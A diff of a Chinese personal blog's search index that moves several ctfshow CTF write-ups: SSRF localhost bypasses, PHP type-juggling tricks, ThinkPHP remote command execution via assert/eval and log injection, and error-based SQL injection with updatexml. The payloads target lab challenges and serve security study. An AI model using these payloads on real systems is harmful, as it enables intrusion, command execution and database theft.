@@ -220,6 +220,55 @@
       </tags>
   </entry>
   <entry>
+    <title>SSRF-CTFSHOW</title>
+    <url>/2024/03/22/SSRF-CTFSHOW/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<p>ssrf本质是把web服务器当作跳板，请求一些不让直接请求的东西</p>
+<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322173840844.png"  alt="image-20240322173840844"></p>
+<p><code>curl_init()</code>打开一个curl会话</p>
+<p><code>curl_setopt()</code>设置输出流信息:</p>
+<p>第一个是不把头文件信息当作输出流带回</p>
+<p>第二个是把curl_exec请求到的信息统统发回</p>
+<p>payload:<code>url=127.0.0.1/flag.php</code></p>
+<h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322175247131.png"  alt="image-20240322175247131"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>前两个都是用0.0.0.0(代表本机任何ip)来绕过的</p>
+<p>后两个分别是用十六进制和八进制来绕过的</p>
+<h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322181428742.png"  alt="image-20240322181428742"></p>
+<p>同上题目</p>
+<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322193022404.png"  alt="image-20240322193022404"></p>
+<p>ban掉了0和1，说明本地的127.0.0.1怎么都绕不过去了</p>
+<p>换一种思路，输入一个解析到127.0.0.1的域名即可</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240322193226851.png"  alt="image-20240322193226851"></p>
+<p>payload:<code>url=http://ecd.tencent.com/flag.php</code></p>
+<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322194654981.png"  alt="image-20240322194654981"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322195149266.png"  alt="image-20240322195149266"></p>
+<p><code>url=http://0/flag.php</code></p>
+<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328194834744.png"  alt="image-20240328194834744"></p>
+<p>FILETER_FLAG_NO_PRIV_RANGE:要求值不在保留的ip范围内</p>
+<p>FILETER_FLAG_NO_RES_RANGE:要求值不在 RFC 指定的私有范围 IP 内</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195426762.png"  alt="image-20240328195426762"></p>
+<p>意思是以上的ip地址都不能用了，就不能用指向了，所以我们用302挑战即可</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195527042.png"  alt="image-20240328195527042"></p>
+<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328200847412.png"  alt="image-20240328200847412"></p>
+<p>要求url以<code>http://ctf.</code>为开头，show为结尾</p>
+<p>payload:<code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>
+<p>@表示以ctf.用户名访问，?表示get传参</p>
+<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1>]]></content>
+      <categories>
+        <category>Write up</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CISCN2024-web复现</title>
     <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>
@@ -355,167 +404,6 @@
       </categories>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP特性ctfshow</title>
-    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
-<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
-<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
-<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
-<p>所以把4476转为16进制，在开头加入0x传入即可</p>
-<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
-<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
-<p>i:不区分大小写匹配</p>
-<p>m:以每行为一个单位匹配</p>
-<p>^:匹配单位的开头</p>
-<p>$:匹配单位的末尾</p>
-<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
-<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
-<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
-<p><strong>payload:%0aphp</strong></p>
-<p>%0a是url编码的换行符</p>
-<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
-<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
-<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
-<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
-<p>上面说了0开头会以八进制识别</p>
-<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
-<p>要想输出flag，有三个条件</p>
-<p>1.num不能强等于4476</p>
-<p>2.num中不能有字母</p>
-<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
-<p>第一种方法:</p>
-<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
-<p>第二种方法:</p>
-<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
-<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
-<p>弱等于，用以上第一种方法</p>
-<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
-<p>传入.&#x2F;flag.php即可</p>
-<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
-<p>强度于，数组绕过</p>
-<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
-<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
-<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
-]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSRF-CTFSHOW</title>
-    <url>/2024/03/22/SSRF-CTFSHOW/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<p>ssrf本质是把web服务器当作跳板，请求一些不让直接请求的东西</p>
-<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322173840844.png"  alt="image-20240322173840844"></p>
-<p><code>curl_init()</code>打开一个curl会话</p>
-<p><code>curl_setopt()</code>设置输出流信息:</p>
-<p>第一个是不把头文件信息当作输出流带回</p>
-<p>第二个是把curl_exec请求到的信息统统发回</p>
-<p>payload:<code>url=127.0.0.1/flag.php</code></p>
-<h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322175247131.png"  alt="image-20240322175247131"></p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure>
-
-<p>前两个都是用0.0.0.0(代表本机任何ip)来绕过的</p>
-<p>后两个分别是用十六进制和八进制来绕过的</p>
-<h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322181428742.png"  alt="image-20240322181428742"></p>
-<p>同上题目</p>
-<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322193022404.png"  alt="image-20240322193022404"></p>
-<p>ban掉了0和1，说明本地的127.0.0.1怎么都绕不过去了</p>
-<p>换一种思路，输入一个解析到127.0.0.1的域名即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240322193226851.png"  alt="image-20240322193226851"></p>
-<p>payload:<code>url=http://ecd.tencent.com/flag.php</code></p>
-<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322194654981.png"  alt="image-20240322194654981"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure>
-
-<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322195149266.png"  alt="image-20240322195149266"></p>
-<p><code>url=http://0/flag.php</code></p>
-<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328194834744.png"  alt="image-20240328194834744"></p>
-<p>FILETER_FLAG_NO_PRIV_RANGE:要求值不在保留的ip范围内</p>
-<p>FILETER_FLAG_NO_RES_RANGE:要求值不在 RFC 指定的私有范围 IP 内</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195426762.png"  alt="image-20240328195426762"></p>
-<p>意思是以上的ip地址都不能用了，就不能用指向了，所以我们用302挑战即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195527042.png"  alt="image-20240328195527042"></p>
-<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328200847412.png"  alt="image-20240328200847412"></p>
-<p>要求url以<code>http://ctf.</code>为开头，show为结尾</p>
-<p>payload:<code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>
-<p>@表示以ctf.用户名访问，?表示get传参</p>
-<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1>]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP-CTFSHOW</title>
-    <url>/2024/04/13/ThinkPHP-ctfshow/</url>
-    <content><![CDATA[<h1 id="挖洞必经之路"><a href="#挖洞必经之路" class="headerlink" title="挖洞必经之路"></a>挖洞必经之路</h1><span id="more"></span>
-
-<p>学</p>
-<p><a class="link"   href="https://static.kancloud.cn/manual/thinkphp/1678" >序言 · ThinkPHP3.2.3完全开发手册 · 看云 (kancloud.cn)<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414110912329.png"  alt="image-20240414110912329"></p>
-<p>如题所说，了解pathinfo即可拿到flag</p>
-<p>payload:<code>index.php/admin/login/ctfshowlogin</code></p>
-<h1 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414111946911.png"  alt="image-20240414111946911"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240414112855650.png"  alt="image-20240414112855650"></p>
-<p>在给出的附件的Commom&#x2F;Conf.php中找到了这个闭包路由，有个可以执行命令的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func()函数第一个参数是要执行的命令，第二个参数是这个命令的参数</span><br></pre></td></tr></table></figure>
-
-<p>比如我们想执行phpinfo()那么我们的payload就是<code>/ctfshow/phpinfo/1</code></p>
-<p>由于在url中使用&#x2F;会被路由替换，所以要把命令逃出来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:/index.php/ctfshow/assert/assert($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br><span class="line">payload2:/index.php/ctfshow/assert/eval($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>不知道为什么用两个eval就打不通，估计现在我还理解不了</p>
-<h1 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240415180500901.png"  alt="image-20240415180500901"></p>
-<p>打开源码发现有可控参数n</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225802599.png"  alt="image-20240415225802599"></p>
-<p>持续跟进函数,最终追到这里</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225923394.png"  alt="image-20240415225923394"></p>
-<p>实际上本地调试的时候不是到这里，看别的文章说是题目环境和我的环境不一样的问题</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:/index.php/Home/index/index?n=&lt;?php system(cat /f*);?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrong payload:/index.php/Home/index/index/n/&lt;?php system(cat /f*);?&gt;</span><br><span class="line">按理来说这是path_info的标准格式，但是我发现要是参数有&lt;后面的东西一概不出来，调试功力不足，也看不出</span><br></pre></td></tr></table></figure>
-
-<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240417105806980.png"  alt="image-20240417105806980"></p>
-<p>爆破+rce</p>
-<p>首先thinkphp的debug模式是自动打开的，也就是说每个报错都会记录到日志中去，这样我们只要读取日志即可</p>
-<p>应该是开发者目录结构设置不好，正常怎么会给进入&#x2F;Application呢</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志目录:/Application/Runtime/Logs/模块名/年份_月份_日期.log</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240417110114141.png"  alt="image-20240417110114141"></p>
-<p>开扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153113112-1713339073489-1.png"  alt="image-20240417153113112"></p>
-<p>会扫出来一个今天的和一个黑客21年留下的后门</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153146759.png"  alt="image-20240417153146759"></p>
-<p>顺着这个后门rce即可</p>
-<h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><p><a class="link"   href="https://blog.csdn.net/qq_50589021/article/details/120616736" >thinkPHP3.2.3sql注入漏洞_think\controller:parsesql方法不存在!-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p>由于我下的版本是3.2.5，本地没复现成功，就看别人的吧</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆表</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</span><br><span class="line">//爆列名</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flags&#x27;),0x7e),1) %23</span><br><span class="line">//爆字段值</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,substr((select group_concat(flag4s) from flags),16,32),0x7e),1) %23</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"><a href="#到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退" class="headerlink" title="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"></a>到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退</h1>]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
-        <tag>thinkphp</tag>
       </tags>
   </entry>
   <entry>
@@ -676,6 +564,60 @@
       </tags>
   </entry>
   <entry>
+    <title>PHP特性ctfshow</title>
+    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
+<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
+<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
+<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
+<p>所以把4476转为16进制，在开头加入0x传入即可</p>
+<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
+<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
+<p>i:不区分大小写匹配</p>
+<p>m:以每行为一个单位匹配</p>
+<p>^:匹配单位的开头</p>
+<p>$:匹配单位的末尾</p>
+<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
+<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
+<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
+<p><strong>payload:%0aphp</strong></p>
+<p>%0a是url编码的换行符</p>
+<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
+<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
+<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
+<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
+<p>上面说了0开头会以八进制识别</p>
+<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
+<p>要想输出flag，有三个条件</p>
+<p>1.num不能强等于4476</p>
+<p>2.num中不能有字母</p>
+<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
+<p>第一种方法:</p>
+<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
+<p>第二种方法:</p>
+<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
+<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
+<p>弱等于，用以上第一种方法</p>
+<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
+<p>传入.&#x2F;flag.php即可</p>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
+<p>强度于，数组绕过</p>
+<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
+<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
+]]></content>
+      <categories>
+        <category>Write up</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nodejs-ctfshow</title>
     <url>/2024/03/02/nodejs-ctfshow/</url>
     <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
@@ -751,6 +693,64 @@
       </tags>
   </entry>
   <entry>
+    <title>ThinkPHP-CTFSHOW</title>
+    <url>/2024/04/13/ThinkPHP-ctfshow/</url>
+    <content><![CDATA[<h1 id="挖洞必经之路"><a href="#挖洞必经之路" class="headerlink" title="挖洞必经之路"></a>挖洞必经之路</h1><span id="more"></span>
+
+<p>学</p>
+<p><a class="link"   href="https://static.kancloud.cn/manual/thinkphp/1678" >序言 · ThinkPHP3.2.3完全开发手册 · 看云 (kancloud.cn)<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414110912329.png"  alt="image-20240414110912329"></p>
+<p>如题所说，了解pathinfo即可拿到flag</p>
+<p>payload:<code>index.php/admin/login/ctfshowlogin</code></p>
+<h1 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414111946911.png"  alt="image-20240414111946911"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240414112855650.png"  alt="image-20240414112855650"></p>
+<p>在给出的附件的Commom&#x2F;Conf.php中找到了这个闭包路由，有个可以执行命令的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func()函数第一个参数是要执行的命令，第二个参数是这个命令的参数</span><br></pre></td></tr></table></figure>
+
+<p>比如我们想执行phpinfo()那么我们的payload就是<code>/ctfshow/phpinfo/1</code></p>
+<p>由于在url中使用&#x2F;会被路由替换，所以要把命令逃出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:/index.php/ctfshow/assert/assert($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br><span class="line">payload2:/index.php/ctfshow/assert/eval($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么用两个eval就打不通，估计现在我还理解不了</p>
+<h1 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240415180500901.png"  alt="image-20240415180500901"></p>
+<p>打开源码发现有可控参数n</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225802599.png"  alt="image-20240415225802599"></p>
+<p>持续跟进函数,最终追到这里</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225923394.png"  alt="image-20240415225923394"></p>
+<p>实际上本地调试的时候不是到这里，看别的文章说是题目环境和我的环境不一样的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:/index.php/Home/index/index?n=&lt;?php system(cat /f*);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrong payload:/index.php/Home/index/index/n/&lt;?php system(cat /f*);?&gt;</span><br><span class="line">按理来说这是path_info的标准格式，但是我发现要是参数有&lt;后面的东西一概不出来，调试功力不足，也看不出</span><br></pre></td></tr></table></figure>
+
+<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240417105806980.png"  alt="image-20240417105806980"></p>
+<p>爆破+rce</p>
+<p>首先thinkphp的debug模式是自动打开的，也就是说每个报错都会记录到日志中去，这样我们只要读取日志即可</p>
+<p>应该是开发者目录结构设置不好，正常怎么会给进入&#x2F;Application呢</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志目录:/Application/Runtime/Logs/模块名/年份_月份_日期.log</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240417110114141.png"  alt="image-20240417110114141"></p>
+<p>开扫</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153113112-1713339073489-1.png"  alt="image-20240417153113112"></p>
+<p>会扫出来一个今天的和一个黑客21年留下的后门</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153146759.png"  alt="image-20240417153146759"></p>
+<p>顺着这个后门rce即可</p>
+<h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><p><a class="link"   href="https://blog.csdn.net/qq_50589021/article/details/120616736" >thinkPHP3.2.3sql注入漏洞_think\controller:parsesql方法不存在!-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p>由于我下的版本是3.2.5，本地没复现成功，就看别人的吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆表</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</span><br><span class="line">//爆列名</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flags&#x27;),0x7e),1) %23</span><br><span class="line">//爆字段值</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,substr((select group_concat(flag4s) from flags),16,32),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"><a href="#到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退" class="headerlink" title="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"></a>到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退</h1>]]></content>
+      <categories>
+        <category>Write up</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>php</tag>
+        <tag>thinkphp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php_Session反序列化学习</title>
     <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
@@ -812,6 +812,72 @@
       </categories>
       <tags>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE漏洞学习</title>
+    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
+
+<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
